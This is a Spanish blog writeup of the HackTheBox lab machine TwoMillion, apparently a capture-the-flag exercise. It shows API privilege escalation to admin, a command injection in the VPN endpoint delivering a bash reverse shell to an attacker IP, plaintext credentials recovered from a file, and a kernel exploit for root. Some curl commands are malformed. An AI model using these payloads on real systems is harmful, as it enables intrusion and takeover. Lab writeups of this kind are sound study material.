---
layout: post
title: "Twomillions"
date: 2025-11-30 18:30:00 -0300
categories: [Writeups,Twomillions]
tags: [Htb, Twomillions, Linux]
description: "Writeup de la máquina Twomillions de Hackthebox"
image: /assets/images/hackthebox.png
---
## Resumen de la resolución

**Twomillion** es una máquina **Linux** de dificultad **Easy** de la plataforma de **HackTheBox**, fue una máquina histórica en Hack The Box debido a que fue por los dos millones de usuarios en la plataforma.

---
## Enumeración

En primer lugar, debemos desplegar la máquina para poder obtener la **Dirección IP** todo ello desde la web de **HackTheBox** y luego desde la **terminal** debemos conectarnos a la VPN usando el fichero correspondiente de la siguiente forma:

```bash
openvpn lab_Frasan15.opvn
```

Luego le lanzamos un **ping** para comprobar si la maquina esta activa. Verificamos que responde correctamente devolviendo el paquete enviado. A continuacion, utilizamos un script propio que, a partir del valor del  **ttl**  permite identificar el tipo de sistema operativo: **Linux (TTL 64 )** o **Windows (TTL 128)**, en este caso, observamos un **TTL** próximo a 64 (**64**) por lo que se trata de una máquina **Linux**

> El motivo por el cual el **TTL** es de **64** es porque el paquete pasa por unos intermediarios (routers) antes de llegar a su destino (máquina atacante). Esto podemos comprobarlo con el comando `ping -c 1 -R 10.10.11.221`.
### Nmap

En segundo lugar, realizaremos un escaneo por **TCP** usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.

```bash
nmap 10.10.11.221 -p- --open -T5 -v -n -oG allPorts
```

Observamos como nos reporta los puertos abiertos.

Ahora, gracias a la utilidad **extractPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.

A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto:

```bash
nmap -sC -sV -p22,80 10.10.11.221 -oN targeted
```

En el segundo escaneo de **Nmap**, descubrimos las versiones tanto del puerto 22 ssh como del puerto 80 http.

![](/assets/images/nmap.png)

___
### Puerto 22 - SSH

Como **SSH** permite inicios de sesion, intentamos conectarnos sin auteniticacion pero no tenemos exito.


### Puerto 80 - HTTP (Web)

Lo primero que realizaremos es identificar tecnologias utilizadas en dicho servicio para eso utilizamos el siguiente comando:

```bash
whatweb http://10.10.11.221
```

Gracias a ese comando identificamos que el sitio web **HTTP** del puerto 80 nos redirecciona al dominio http://2million.htb/ Para poder visualizar la redirección debemos de incluirla en el archivo \etc\hosts. 
Para eso utilizamos el siguiente comando: 

```bash
echo '10.10.11.221 2million.htb' | sudo tee -a /etc/hosts
```

Una vez hecho eso abrimos el sitio web y realizamos una inspeccion de codigo, dentro de la inspeccion encontramos un codigo de invitacion.
El codigo estaba encriptado mediante ROT13, para desencritparlo simplemente buscamos en google ROT13.com pegamos el codigo y lo que estariamos obteniendo no seria el codigo como esperabamos sino la ruta donde se encuentra el codigo de invitacion.

Para identificar el codigo en dicha ruta realizaremos un curl de esta forma:

```bash
curl -s -X POST http://2million.htb/api/v1/invite/generate
```
Dicha solicitud nos retorno un código codificado en Base64, para decodificarlo simplemente utilizamos el siguiente comando:

```bash
echo "TVM3MLMlt0FpBNFotQjNMNVEtWFE3TFo=" | base64 -d                               
```
El código obtenido permitió completar el proceso de registro en la aplicación web de forma exitosa. 

Una vez dentro del sitio, inspeccionamos y logramos encontrar “PHPSESSID” el cual es la cookie de sesión para mantener la cuenta activa.

Realizamos una peticion **GET** al endpoint /api/v1/ 


```bash
curl -s -X http://2million.htb/api/v1/ -H "Cookie:PHPSESSID=ur9lqvppvr1b64cr4p0em8ulqb | jq                              
```
La respuesta revela las rutas disponibles de la **API**, las cuales pueden ser utilizadas para analizar el comportamiento del sistema y evaluar posibles vectores de escalada de privilegios

Tras revisar los endpoints encontrados detectamos uno el cual nos permitió escalar de privilegios como administrador.

Realizamos nuevamente un **curl** el cual nos confirma que el usuario true es administrador.


```bash
curl -s -L -X PUT "http://2million.htb/api/v1/admin/settings/update" \
-H "Cookie: PHPSESSID=7u1u4o2aacvjhhiqcukbj344poo" \
-H "Content-Type: application/json" \
-d '{ "email": "true@true.com", "is_admin": 1 }'
```
Se realizó una solicitud al endpoint /admin/vpn/generate la cual nos permitió obtener un archivo de configuración VPN completo 


```bash
curl -s -L -X POST "http://2million.htb/api/v1/admin/vpn/generate" \
-H "Cookie: PHPSESSID=u71u4o2aacvjhhiqcukkj344po0" \
-H "Content-Type: application/json" \
-d '{"username": "true"}'
```
Logramos identificar una vulnerabilidad command injection(inyección de comandos) la cual es una vulnerabilidad crítica.

```bash
curl -X POST "http://2million.htb/api/v1/admin/vpn/generate" \
-H "Cookie: PHPSESSID=u71u4o2aacvjhhiqcukkj344po0" \
-H "Content-Type: application/json" \
-d '{"username": "true; ping -c 10 127.0.0.1;"}'
```
Se envía una solicitud POST al endpoint administrativo.
El servidor acepta y ejecuta el comando, como también devuelve la salida del ping en la respuesta. 
Esta vulnerabilidad corresponde a una inyección de comandos(Command injection), categorizada bajo CWE-77. Esta 
clase de fallo permite la ejecución de comandos arbitrarios sobre el sistema operativo del servidor, comprometiendo 
completamente su integridad. 

Dentro de otra terminal ejecutaremos **netcat** para interceptar el trafico de red en el puerto 4444.

```bash
nc -lvnp 4444
```
Ahora abrimos un puerto de escucha en la máquina atacante. 


```bash
curl -X POST "http://2million.htb/api/v1/admin/vpn/generate" \
-sv \
--cookie "PHPSESSID=u71u4o2aacvjhhqcukki344po0" \
--header "Content-Type: application/json" \
--data '{"username": "test; bash -i >& /dev/tcp/10.10.14.21/4444 0>&1;"}'
```
Enviamos ese comando con la intención de que desde la otra maquina podamos interpretarlo 
Logramos interceptar y acceder a ella, luego configuramos para que al utilizar **nano** sea una consola totalmente interactiva.

Una vez dentro vemos el directorio con “ls” y logramos identificar el Database.php, entramos dentro del mismo y logramos ver user y pass pero sin contenido.
Logramos obtener las credenciales de un usuario junto a su contraseña.
Para lograr esto pusimos en la consola “ls-la” para ver si había archivos como .user, .pass, .bak, etc. 
Gracias a eso logramos identificar que el usuario es **admin** y la contraseña es **SuperDuperPass123** 
Ya tenemos acceso al usuario administrador. 

Para acceder a el usuario admin, ponemos “su admin” en la consola, la misma nos va a pedir la contraseña que es la 
que encontramos anteriormente y ya estaríamos dentro.


Enviando un cat /var/mail/admin identificamos varios correos electrónicos, y un mensaje el cual nos pide que tratemos 
con cierta vulnerabilidad. 
vulnerabilidad de OverlayFS / FUSE

Para comenzar clonamos “sxlmnwb” de github.

Ejecutamos el primer comando en una terminal 

En otra terminal ejecutamos el segundo comando **./exp**, una vez termina de ejecutarse el comando probamos el 
comando whoami y vemos que ya somos usuario root, por lo que hemos explotado la vulnerabilidad exitosamente. 

La máquina TwoMillion me resultó entretenida porque mezcla varias vulnerabilidades encadenadas: manejo de sesiones, escalada a admin por la API y una inyección en el parámetro del VPN que permite ejecutar comandos. No es muy complicada, pero me gustó porque obliga a entender bien cómo funciona todo el flujo y aprovecharlo paso a paso.
